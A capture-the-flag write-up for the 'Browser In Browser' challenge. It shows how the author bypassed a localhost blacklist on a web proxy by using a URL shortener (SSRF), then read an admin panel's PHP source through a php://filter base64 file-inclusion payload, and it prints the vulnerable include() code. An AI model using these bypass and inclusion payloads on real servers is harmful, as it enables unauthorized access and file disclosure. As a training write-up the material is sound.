# Browser In Browser

## Instructions

> Une entreprise vous propose de naviguer sur internet à l'aide de leur site web.
>
> Cela permet de faire passer les sites à visiter dans une sandbox, permettant d'éviter la visite de site malveillant. Etant une version alpha, vous êtes mandaté pour auditer ce site web.
>
> Accès au challenge [ici](http://bib.ctf.midnightflag.fr/)

## Challenge

We are on a website that can be used as a proxy for other websites
![](https://i.imgur.com/HZuWSRm.png)

We can think that the request is made directly form chall's server, and that we could exploit this to get informations only seen server-side.

One think we could think would be to request for http://127.0.0.1 to access an administration console

![](https://i.imgur.com/h5FaAjy.png)

Unfortunately, we are unauthorized, but it means that the url could be filtered to see if it is not blacklisted. We now search a way to bypass this filtering.

## Bypass filtering

If 127.0.0.1 is really in a blacklist, it means that we could just [shorten](https://bitly.com/) it to bypass the blacklist

Thus, we send the localhost's shortened url and bingo !
![](https://i.imgur.com/zbgc7SR.png)

Now, with the shortened version of this url http://127.0.0.1/admin_panel.php, we got this message
![](https://i.imgur.com/yAs5HZC.png)

It means that we can use a `viewFile` function to display a file, such as the source code for admin_panel.php for example.

But be careful to see plain text for a php file. Since the subpage is shown via and `include()`, the php file could be interpreted.

To bypass this issue, one technique is to use a base64 filter to encode the php file, to decode it later.

With those informations, our payload looks like this

http://127.0.0.1/admin_panel.php?**action=viewFile**&file=php://filter/read=convert.**base64-encode**/resource=admin_panel.php

However, it looks like the server add an additional .php

![](https://i.imgur.com/tHD5CEc.png)

so we remove it :

http://127.0.0.1/admin_panel.php?**action=viewFile**&file=php://filter/read=convert.**base64-encode**/resource=admin_panel

We shorten it and bingo !

![](https://i.imgur.com/lQIpMIN.png)

We [decode](https://www.base64decode.org/) it and double bingo !

```php
<?php
session_start();
//MCTF{________}
if($_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    die("<!DOCTYPE html><html><head><title>Unauthorize</title></head><body><h1>403 Forbidden.</h1></body></html>");
}
if(!isset($_GET['action'])){
    die("Missing action.<br>Available action are: viewUsers, viewFile, ...");
}else{
    if($_GET['action'] === 'viewUsers') die('Database not implemented.<br>Only one user: guest with password guest.');
    if($_GET['action'] === 'viewFile'){
        if(isset($_GET['file'])){
            include($_GET['file'].".php");
        }else{
            die('Missing file.');
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin panel 1.0</title>
</head>
<body></body>
</html>

```